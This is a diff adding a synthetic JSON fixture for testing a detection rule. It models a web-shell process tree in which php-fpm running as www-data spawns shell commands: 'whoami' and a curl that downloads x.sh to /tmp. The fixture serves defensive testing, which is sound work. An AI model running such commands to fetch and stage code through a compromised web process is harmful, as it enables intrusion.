@@ -1,0 +1,24 @@
+{
+  "label": "malicious",
+  "variant": "php-fpm -> sh -c whoami; then curl to /tmp",
+  "source": "synthetic (pattern from Datadog PHP2Shell process tree, not a real payload log)",
+  "expect_alert": true,
+  "result": "not run",
+  "synthetic": true,
+  "events": [
+    {
+      "InitiatingProcessFileName": "php-fpm8.2",
+      "FileName": "sh",
+      "ProcessCommandLine": "/bin/sh -c whoami",
+      "AccountName": "www-data",
+      "DeviceName": "web1"
+    },
+    {
+      "InitiatingProcessFileName": "php-fpm8.2",
+      "FileName": "sh",
+      "ProcessCommandLine": "/bin/sh -c curl http://127.0.0.1/x.sh -o /tmp/x.sh",
+      "AccountName": "www-data",
+      "DeviceName": "web1"
+    }
+  ]
+}
